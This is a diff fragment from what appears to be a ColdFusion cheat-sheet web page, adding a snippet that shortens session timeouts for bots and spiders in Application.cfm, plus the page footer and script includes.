+                    <div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Lower Session Timeouts for Bots and Spiders</p>
+                                <pre>#in Application.cfm
+&#x3c;cfif StructKeyExists(cookie, "cfid") or StructKeyExists(cookie, "jsessionid")>
+&#x3c;cfset REQUEST.sessionTimeout = CreateTimeSpan(0,0,30,0) />
+&#x3c;cfelse>
+ &#x3c;cfset REQUEST.sessionTimeout = CreateTimeSpan(0,0,0,2) />
+&#x3c;/cfif>
+
+#REQUEST.sessionTimeout variable in cfapplication tag
+
+&#x3c;cfapplication name="myawesomeapp"
+     sessionmanagement="Yes"
+     sessiontimeout="#REQUEST.sessionTimeout#"></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <footer>
+                <p>Built & Maintained by <a target="_blank" href="https://www.facebook.com/stefanneropejcic">Stefan Pejcic</a></p><small>ColdFusion is a trademark of Adobe Systems Incorporated.</small>
+            </footer>
+
+        </div>
+
+        <script src="js/main.min.js"></script>
+		<script src="js/util.js"></script>
+		<script src="js/main.js"></script>
+    </body>
+</html>
